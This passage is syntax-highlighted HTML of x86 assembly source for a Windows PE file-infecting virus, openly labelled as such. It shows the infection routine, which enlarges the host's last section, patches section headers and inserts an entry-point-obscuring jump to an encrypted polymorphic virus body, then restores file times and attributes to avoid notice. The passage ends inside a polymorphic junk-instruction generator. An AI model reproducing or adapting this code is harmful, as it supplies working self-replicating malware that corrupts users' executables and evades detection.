        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; PointerToRawData of sect n-1</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; another BSS section ?!</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">abort_infection</span><span class="sc0">                      </span><span class="sc1">; if yes, better not infect</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; SizeOfRawData of sect. n-1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">            </span><span class="sc1">; Set new PointerToRawData</span><span class="sc0">
</span><span class="sc5">not_BSS</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; old VirtualSize of sect. n</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.virus_offset</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; store virus-file-offset</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; old Raw size of sect. n</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">              </span><span class="sc1">; set new VirtualSize</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; SizeOfRawData</span><span class="sc0">
                                                </span><span class="sc1">; EDI=filesize increase</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; VirtualSize</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; SizeOfRawData</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.FileSizeLow</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; ESI=old filesize</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                            </span><span class="sc1">; EDI=new filesize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.FileSizeLow</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">find_non_BSS_section</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; PointerToRawData sect n+1</span><span class="sc0">
        </span><span class="sc6">JCXZ</span><span class="sc0"> </span><span class="sc5">find_non_BSS_section</span><span class="sc0">

        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">std</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">

</span><span class="sc5">correct_section_headers_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">                            </span><span class="sc1">; next section header</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">dont_correct_section_header</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">            </span><span class="sc1">; correct PointerToRawData</span><span class="sc0">
</span><span class="sc5">dont_correct_section_header</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">correct_section_headers_loop</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                            </span><span class="sc1">; ECX=filesize increase</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.epo_offset</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; where to place jmp to virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.epo_opcode</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; how to give control to virus</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; store the opcode</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.virus_RVA</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; EAX=RVA of virus</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; save it</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.epo_RVA</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; calculate jmp displacement</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                              </span><span class="sc1">; length of jmp/call near</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; store it</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.write_section_RVA_ptr</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; ptr to RVA of writeable sect</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">; EAX=RVA of writeable section</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; ECX=RVA of virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.virus_RVA_ptr</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; ptr to virusRVA in decryptor</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.decryptor_size</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; ECX=start of encrypted virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                          </span><span class="sc1">; new virusRVA to decryptor</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.jmp_displacement_ptr</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; EDX=ptr to jmp to decrypted</span><span class="sc0">
                                                </span><span class="sc1">; virus in decryptor</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">; calculate jmp displacement</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">; set the new one</span><span class="sc0">


        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.poly_virus_body</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; ESI=poly virus body</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.virus_offset</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; EDI=virus location in map</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.poly_virus_size</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; ECX=size of poly virus body</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                               </span><span class="sc1">; copy poly virus body to file</span><span class="sc0">



</span><span class="sc5">already_infected</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">abort_infection</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.mapbase</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; unmap file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.UnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">closefilemapping</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.maphandle</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; close mapping object</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.CloseHandle</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; relative to start of file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; high dword ptr to file offs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.FileSizeLow</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.filehandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.SetFilePointer</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; set filepointer to new EOF</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.filehandle</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; truncate file at end</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.SetEndOfFile</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.LastWriteTime</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; restore old filetimes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.filehandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.SetFileTime</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">close_file_error</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.filehandle</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; close file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.CloseHandle</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">restore_attributes</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.FileAttributes</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; restore old file attributes</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.FileName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; offset filename</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">quit_infect_error</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc1">; ----- CONVERT RVA TO PHYSICAL OFFSET --------------------------------------</span><span class="sc0">

</span><span class="sc5">get_section</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; EDI=VirtualAddress</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0"> </span><span class="sc5">try_next_section</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; VirtualSize</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0"> </span><span class="sc5">found_our_section</span><span class="sc0">

</span><span class="sc5">try_next_section</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">                            </span><span class="sc1">; go to next section header</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">get_section</span><span class="sc0">

</span><span class="sc5">found_our_section</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; PointerToRawData</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; VirtualAddress</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; EDI=difference RVA/offset in</span><span class="sc0">
                                                </span><span class="sc1">; memmap for this section</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                            </span><span class="sc1">; ESI=offset in memmap that</span><span class="sc0">
                                                </span><span class="sc1">; corresponds to the given RVA</span><span class="sc0">

        </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc1">; ----- POLY ENGINE SUBROUTINES ---------------------------------------------</span><span class="sc0">

</span><span class="sc5">_AX</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_CX</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">_DX</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">_BX</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">_SP</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">_BP</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">_SI</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">_DI</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">


</span><span class="sc5">add_junk</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; save registers</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">get_random</span><span class="sc0">                         </span><span class="sc1">; get a random number</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11b</span><span class="sc0">                            </span><span class="sc1">; random number from 0 to 3</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; random number from 1 to 4</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">counter_ok</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; random number from 1 to 3</span><span class="sc0">
</span><span class="sc5">counter_ok</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                           </span><span class="sc1">; ESI=counter for junk-opcodes</span><span class="sc0">

</span><span class="sc5">add_junk_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">                             </span><span class="sc1">; first byte of opcode</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">get_random</span><span class="sc0">                         </span><span class="sc1">; get a random number between</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                               </span><span class="sc1">; 0C0h and 0F8h, all those</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                               </span><span class="sc1">; opcodes are arithmetic</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">                            </span><span class="sc1">; instructions of the form</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                           </span><span class="sc1">; op reg32, imm32</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">get_register</span><span class="sc0">                       </span><span class="sc1">; get a garbage register</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; store the 2nd byte of opcode</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">get_random</span><span class="sc0">                         </span><span class="sc1">; random imm32</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; store</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                 </span><span class="sc1">; decrease counter</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">add_junk_loop</span><span class="sc0">                       </span><span class="sc1">; repeat loop if counter != 0</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                 </span><span class="sc1">; restore registers</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc5">get_register</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">get_random</span><span class="sc0">                         </span><span class="sc1">; get a random number</span><span class="sc0">
